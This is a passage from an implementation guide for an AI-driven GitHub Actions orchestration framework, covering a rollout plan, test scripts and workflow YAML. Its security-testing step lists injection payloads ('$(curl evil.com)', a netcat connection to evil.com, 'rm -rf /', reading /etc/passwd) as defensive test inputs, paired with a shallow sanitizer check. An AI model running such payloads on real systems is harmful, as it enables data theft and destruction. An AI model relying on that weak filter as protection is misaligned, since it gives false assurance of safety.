1. Coverage report adapter implementation
2. GitHub issues adapter creation
3. Static analysis adapter development
4. Pluggable interface design

# Deliverables
- coverage-discovery-adapter.py
- issues-discovery-adapter.py
- static-analysis-adapter.py
- WorkDiscoveryAdapter interface specification
```

**Day 25-26: Adapter Integration**
```bash
# Implementation tasks
1. Integrate adapters with scheduler
2. Test work discovery accuracy
3. Validate adapter pluggability
4. Document adapter development

# Deliverables
- Adapter integration in scheduler
- Work discovery testing results
- Adapter development guide
- Performance benchmarks
```

**Day 27-28: Phase 2 Validation**
```bash
# Comprehensive testing
1. Universal pipeline full functionality
2. Work discovery adapter accuracy
3. End-to-end mission orchestration
4. Performance and resource usage

# Success criteria
- Universal pipeline replaces existing workflows
- Work discovery accurately identifies tasks
- Complete autonomous cycles function
- Performance within acceptable limits
```

### 8.3 Phase 3: Integration and Testing (Weeks 5-6)

#### Week 5: End-to-End Integration
**Day 29-31: Complete Autonomous Cycles**
```bash
# Integration testing
1. Scheduler ‚Üí Work Discovery ‚Üí Mission Execution
2. Mission ‚Üí PR Creation ‚Üí Review ‚Üí Merge
3. Multi-epic coordination and resource sharing
4. Failure recovery and retry mechanisms

# Validation scenarios
- Coverage epic autonomous development
- Tech debt epic automated resolution
- Performance epic optimization cycles
- Cross-epic resource coordination
```

**Day 32-33: Multi-Epic Coordination**
```bash
# Complex scenario testing
1. Multiple epics running simultaneously
2. Resource contention and resolution
3. Cross-epic dependencies and coordination
4. Priority-based resource allocation

# Success criteria
- Multiple epics run without interference
- Resource conflicts resolved automatically
- Dependencies respected and coordinated
- Priority system functions correctly
```

**Day 34-35: Performance Optimization**
```bash
# Performance tuning
1. Workflow execution time optimization
2. GitHub Actions resource efficiency
3. AI service call optimization
4. Cost monitoring and control validation

# Optimization targets
- Reduce mission workflow time by 20%
- Optimize GitHub Actions resource usage
- Minimize AI service costs
- Improve error recovery time
```

#### Week 6: Production Readiness
**Day 36-38: Comprehensive Testing**
```bash
# Production scenario testing
1. High load scenario simulation
2. Extended autonomous operation testing
3. Failure scenario recovery validation
4. Security boundary enforcement testing

# Testing scenarios
- 10+ concurrent missions
- 72-hour autonomous operation
- Network failure recovery
- Security permission validation
```

**Day 39-40: Documentation and Training**
```bash
# Production readiness
1. Operational runbooks creation
2. Troubleshooting guide development
3. Team training material preparation
4. Deployment procedure documentation

# Deliverables
- Operations runbook
- Troubleshooting guide
- Training presentation
- Deployment checklist
```

**Day 41-42: Phase 3 Validation**
```bash
# Final validation
1. Production readiness assessment
2. Security review completion
3. Performance benchmark validation
4. Team readiness confirmation

# Go-live criteria
- All tests pass consistently
- Security review approved
- Performance meets requirements
- Team trained and ready
```

### 8.4 Phase 4: Deployment and Optimization (Weeks 7-8)

#### Week 7: Canary Deployment
**Day 43-45: Canary Environment Setup**
```bash
# Controlled deployment
1. Deploy to non-critical epic branches first
2. Monitor performance and reliability
3. Validate autonomous operation
4. Collect feedback and metrics

# Canary criteria
- Deploy to 2-3 low-risk epic branches
- Monitor for 48 hours minimum
- No critical issues identified
- Performance within expectations
```

**Day 46-47: Monitoring and Observability**
```bash
# Production monitoring
1. Comprehensive logging implementation
2. Alerting system configuration
3. Performance dashboard creation
4. Cost tracking dashboard setup

# Monitoring deliverables
- Centralized logging system
- Alert configuration
- Performance dashboard
- Cost tracking system
```

**Day 48-49: Issue Resolution**
```bash
# Production issue resolution
1. Address any issues found in canary
2. Performance optimization based on real data
3. Documentation updates based on experience
4. Team feedback integration

# Resolution outcomes
- All critical issues resolved
- Performance optimized
- Documentation updated
- Team feedback integrated
```

#### Week 8: Full Production Deployment
**Day 50-52: Production Rollout**
```bash
# Full deployment
1. Deploy to all epic branches
2. Enable full autonomous operation
3. Monitor comprehensive metrics
4. Provide team support

# Rollout phases
- Phase 1: Coverage epics (Day 50)
- Phase 2: Tech debt epics (Day 51)
- Phase 3: All epic types (Day 52)
```

**Day 53-54: Performance Validation**
```bash
# Production validation
1. Validate all autonomous cycles function
2. Confirm performance meets requirements
3. Verify cost controls are effective
4. Ensure team adoption is successful

# Success metrics
- 95% mission success rate
- <30 minute average mission time
- Cost within budget limits
- Team satisfaction >80%
```

**Day 55-56: Optimization and Handoff**
```bash
# Final optimization
1. Performance tuning based on production data
2. Cost optimization implementation
3. Documentation finalization
4. Team handoff completion

# Final deliverables
- Optimized production system
- Complete documentation
- Trained operations team
- Success metrics baseline
```

## 9. Testing and Validation Strategy

### 9.1 Component Testing

#### 9.1.1 Configuration Loader Testing
```python
# test_config_loader.py
import pytest
import yaml
from config_loader import AIConfigurationLoader

class TestAIConfigurationLoader:
    def test_branch_pattern_matching(self):
        """Test branch pattern matching accuracy"""
        loader = AIConfigurationLoader("test_config.yml")

        # Test epic coverage pattern
        config = loader.resolve_branch_pattern("epic/testing-coverage-to-90")
        assert config['ai_behavior'] == 'iterative-autonomous'
        assert config['work_discovery']['enabled'] == True

        # Test feature branch pattern
        config = loader.resolve_branch_pattern("feature/add-new-endpoint")
        assert config['ai_behavior'] == 'single-review'
        assert config['quality_gates'] == 'feature'

        # Test main branch pattern
        config = loader.resolve_branch_pattern("main")
        assert config['ai_behavior'] == '5-sentinel-suite'
        assert config['quality_gates'] == 'production'

    def test_priority_ordering(self):
        """Test that higher priority patterns match first"""
        loader = AIConfigurationLoader("test_config.yml")

        # Ambiguous branch that could match multiple patterns
        config = loader.resolve_branch_pattern("epic/testing-coverage-special")

        # Should match higher priority coverage_epic pattern
        assert config['pattern'] == "^epic/testing-coverage-.*"

    def test_configuration_validation(self):
        """Test configuration syntax validation"""
        loader = AIConfigurationLoader("test_config.yml")
        assert loader.validate_configuration() == True

        # Test with invalid configuration
        invalid_loader = AIConfigurationLoader("invalid_config.yml")
        assert invalid_loader.validate_configuration() == False
```

#### 9.1.2 Mission Workflow Testing
```yaml
# .github/workflows/test-mission-workflow.yml
name: Test Mission Workflow

on:
  workflow_dispatch:
    inputs:
      test_scenario:
        required: true
        type: choice
        options: ['success', 'build_failure', 'test_failure', 'ai_failure']

jobs:
  test-mission-execution:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup test environment
        run: |
          # Create test branch and scenario
          case "${{ inputs.test_scenario }}" in
            "build_failure")
              echo "Simulating build failure scenario"
              sed -i 's/valid_code/invalid_syntax/' Code/Zarichney.Server/Program.cs
              ;;
            "test_failure")
              echo "Simulating test failure scenario"
              sed -i 's/Assert.True/Assert.False/' Code/Zarichney.Server.Tests/SampleTest.cs
              ;;
            "ai_failure")
              echo "Simulating AI service failure"
              export OPENAI_API_KEY="invalid_key"
              ;;
          esac

      - name: Execute mission workflow
        uses: ./.github/workflows/ai-mission-coverage.yml
        with:
          target_branch: 'test-branch'
          mission_mode: 'create'
          scheduled_trigger: 'true'

      - name: Validate mission behavior
        run: |
          # Validate that mission handled scenario appropriately
          case "${{ inputs.test_scenario }}" in
            "success")
              # Should complete successfully
              test "${{ steps.mission.outputs.status }}" = "success"
              ;;
            "build_failure"|"test_failure")
              # Should collect diagnostic context but not fail
              test -f "diagnostic_context.json"
              grep -q "build_success.*false\|test_success.*false" diagnostic_context.json
              ;;
            "ai_failure")
              # Should fail gracefully with appropriate error
              test "${{ steps.mission.outputs.status }}" = "degraded"
              ;;
          esac
```

### 9.2 Integration Testing

#### 9.2.1 Multi-Epic Coordination Testing
```bash
#!/bin/bash
# test_multi_epic_coordination.sh

echo "üß™ Testing multi-epic coordination scenarios"

# Setup test epic branches
git checkout -b epic/testing-coverage-integration-test
git checkout -b epic/tech-debt-integration-test
git checkout -b epic/performance-integration-test

# Trigger scheduler with multiple active epics
gh workflow run ai-orchestration-scheduler.yml \
  --field force_discovery=true \
  --field dry_run=false

# Monitor concurrent mission execution
echo "Monitoring concurrent missions..."
sleep 60

# Validate resource management
RUNNING_MISSIONS=$(gh run list --workflow="ai-mission-coverage.yml" --status=in_progress | wc -l)
MAX_PARALLEL=2

if [ $RUNNING_MISSIONS -le $MAX_PARALLEL ]; then
  echo "‚úÖ Resource management: PASSED (Running: $RUNNING_MISSIONS, Max: $MAX_PARALLEL)"
else
  echo "‚ùå Resource management: FAILED (Running: $RUNNING_MISSIONS, Max: $MAX_PARALLEL)"
  exit 1
fi

# Validate no resource conflicts
echo "Checking for resource conflicts..."
# Implementation for conflict detection
```

#### 9.2.2 Failure Recovery Testing
```yaml
# .github/workflows/test-failure-recovery.yml
name: Test Failure Recovery

on:
  workflow_dispatch:
    inputs:
      failure_type:
        required: true
        type: choice
        options: ['network', 'api_quota', 'github_api', 'workflow_timeout']

jobs:
  simulate-failure:
    runs-on: ubuntu-latest
    steps:
      - name: Simulate failure scenario
        run: |
          case "${{ inputs.failure_type }}" in
            "network")
              # Block external network temporarily
              sudo iptables -A OUTPUT -d 0.0.0.0/0 -j DROP
              ;;
            "api_quota")
              # Simulate API quota exhaustion
              export OPENAI_API_KEY="quota_exceeded_key"
              ;;
            "github_api")
              # Simulate GitHub API rate limiting
              export GITHUB_TOKEN="rate_limited_token"
              ;;
            "workflow_timeout")
              # Simulate workflow timeout
              timeout 5s sleep 10
              ;;
          esac

      - name: Trigger mission with failure
        continue-on-error: true
        uses: ./.github/workflows/ai-mission-coverage.yml
        with:
          target_branch: 'test-failure-recovery'
          mission_mode: 'create'
          scheduled_trigger: 'true'

      - name: Validate recovery behavior
        run: |
          # Check that failure was handled gracefully
          # Verify retry mechanisms activated
          # Confirm escalation procedures triggered
          echo "Validating recovery behavior for ${{ inputs.failure_type }}"
```

### 9.3 Production Readiness Testing

#### 9.3.1 Load Testing
```bash
#!/bin/bash
# load_test.sh

echo "üöÄ Starting load testing for AI orchestration framework"

# Create multiple epic branches for testing
for i in {1..10}; do
  git checkout -b "epic/testing-coverage-load-test-$i"
  # Add some changes to trigger work discovery
  echo "// Load test change $i" >> Code/Zarichney.Server/Controllers/TestController.cs
  git add . && git commit -m "Load test change $i"
  git push origin "epic/testing-coverage-load-test-$i"
done

# Trigger scheduler to discover all branches
gh workflow run ai-orchestration-scheduler.yml \
  --field force_discovery=true

# Monitor system behavior under load
echo "Monitoring system under load..."
start_time=$(date +%s)
max_duration=3600  # 1 hour

while [ $(($(date +%s) - start_time)) -lt $max_duration ]; do
  # Check running workflows
  running_workflows=$(gh run list --status=in_progress | wc -l)

  # Check GitHub API rate limits
  rate_limit=$(gh api rate_limit | jq '.rate.remaining')

  # Check resource usage
  echo "$(date): Running workflows: $running_workflows, Rate limit remaining: $rate_limit"

  # Alert if thresholds exceeded
  if [ $running_workflows -gt 5 ]; then
    echo "‚ö†Ô∏è Warning: High workflow concurrency: $running_workflows"
  fi

  if [ $rate_limit -lt 1000 ]; then
    echo "‚ö†Ô∏è Warning: Low rate limit remaining: $rate_limit"
  fi

  sleep 30
done

echo "‚úÖ Load testing completed"
```

#### 9.3.2 Security Testing
```yaml
# .github/workflows/security-testing.yml
name: Security Testing

on:
  workflow_dispatch:

jobs:
  test-permission-boundaries:
    runs-on: ubuntu-latest
    steps:
      - name: Test token permissions
        run: |
          echo "üîê Testing GitHub token permission boundaries"

          # Should succeed (read permissions)
          gh api repos/${{ github.repository }} > /dev/null

          # Should succeed (actions write)
          gh workflow list > /dev/null

          # Should succeed (PR write)
          gh pr list > /dev/null

          # Should fail (admin permissions)
          if gh api repos/${{ github.repository }}/settings 2>/dev/null; then
            echo "‚ùå Security violation: Token has admin permissions"
            exit 1
          else
            echo "‚úÖ Token permissions appropriately restricted"
          fi

      - name: Test input sanitization
        run: |
          echo "üßΩ Testing input sanitization"

          # Test with malicious inputs
          malicious_inputs=(
            '"; rm -rf / #'
            '<script>alert("xss")</script>'
            '$(curl evil.com)'
            '`cat /etc/passwd`'
            '|& nc evil.com 4444'
          )

          for input in "${malicious_inputs[@]}"; do
            # Test that inputs are properly sanitized
            sanitized=$(echo "$input" | sed 's/[<>&"|`$\\]//g' | tr -d '\0')

            if [[ "$sanitized" == *"rm -rf"* ]] || [[ "$sanitized" == *"script"* ]]; then
              echo "‚ùå Input sanitization failed for: $input"
              exit 1
            fi
          done

          echo "‚úÖ Input sanitization working correctly"
```

## 10. Conclusion

This comprehensive GitHub Actions implementation guide provides the complete technical specifications needed to deploy Epic #181's AI orchestration framework. The implementation builds upon proven foundation components and establishes a universal CI/CD system with intelligent branch-aware AI integration.

### 10.1 Key Implementation Components

**1. Default-Branch Dispatcher**
- Complete YAML implementation with GitHub CLI integration
- Dynamic mission matrix generation and health monitoring
- Cron trigger strategy with intelligent branch discovery

**2. Mission Workflow Templates**
- Universal template structure with non-blocking philosophy
- Complete diagnostic context collection and AI integration
- Mission-specific templates for coverage, tech debt, and performance

**3. Review Workflow Specifications**
- Blocking foundation validation with automatic draft conversion
- Iterative AI review integration with quality gate enforcement
- Auto-merge logic with comprehensive checklist validation

**4. AI Configuration Registry**
- Complete YAML schema with branch pattern matching
- Python configuration loader with validation and testing
- Dynamic behavior selection based on branch characteristics

**5. Universal Build Workflow**
- Foundation pipeline supporting all branch types
- Conditional AI integration with operation-aware blocking
- Quality gate enforcement appropriate to branch classification

### 10.2 Critical Success Factors

**Issue #220 Resolution (BLOCKING)**
- Coverage Epic Merge Orchestrator AI conflict resolution required
- Multi-PR consolidation functionality depends on this implementation
- Framework deployment blocked until this dependency is resolved

**Configuration Management Excellence**
- Zero-configuration AI behavior selection through pattern matching
- Comprehensive validation and testing of configuration logic
- Clear migration path from existing workflow patterns

**Production Readiness Requirements**
- Comprehensive testing across all component and integration scenarios
- Security validation with appropriate permission boundaries
- Performance optimization for resource efficiency and cost control

### 10.3 Implementation Timeline

**8-Week Phased Deployment:**
- **Weeks 1-2:** Core infrastructure and scheduler implementation
- **Weeks 3-4:** Universal pipeline and work discovery adapters
- **Weeks 5-6:** Integration testing and performance optimization
- **Weeks 7-8:** Canary deployment and production rollout

### 10.4 Risk Mitigation Strategies

**Technical Risk Management:**
- AI service reliability with retry logic and fallback strategies
- GitHub Actions resource management with concurrency controls
- Configuration complexity managed through validation and testing

**Operational Risk Management:**
- Mission workflow failure recovery with comprehensive error handling
- PR state management with manual override capabilities
- Cross-epic coordination with resource isolation and priority management

### 10.5 Expected Outcomes

**Organizational Development Automation:**
- Unlimited autonomous workstreams through pluggable architecture
- Branch-aware intelligence for appropriate AI behavior selection
- Cost-controlled operations with comprehensive monitoring

**Scalable Foundation for Growth:**
- Growth through intelligent automation rather than additional human resources
- Pluggable work discovery adapters for extensibility to new workstreams
- Universal pipeline supporting all development patterns and epic types

### 10.6 Next Steps

1. **Prioritize Issue #220 resolution** for merge orchestrator capability
2. **Begin Phase 1 implementation** with AI configuration registry
3. **Execute phased deployment** with comprehensive testing and validation
4. **Monitor framework performance** and optimize based on operational experience

This implementation guide provides the technical specificity required for successful framework deployment while maintaining alignment with Epic #181's strategic objectives and organizational development patterns. The comprehensive nature of the specifications ensures implementation teams can execute the deployment without guesswork, while the risk mitigation strategies provide confidence in production operation.

**Framework Deployment Status:** Ready for implementation pending Issue #220 resolution.

üóÇÔ∏è WORKING DIRECTORY ARTIFACT CREATED:
- Filename: 14-github-actions-implementation-guide.md
- Purpose: Comprehensive technical implementation guide for Epic #181 AI orchestration framework with exact YAML configurations, Python scripts, and deployment procedures
- Context for Team: Complete implementation specifications ready for WorkflowEngineer execution, includes all components from scheduler to universal pipeline
- Dependencies: Built upon WorkflowEngineer analysis in epic-181-ai-orchestration-implementation-guide.md, requires Issue #220 resolution
- Next Actions: WorkflowEngineer can begin Phase 1 implementation using exact technical specifications provided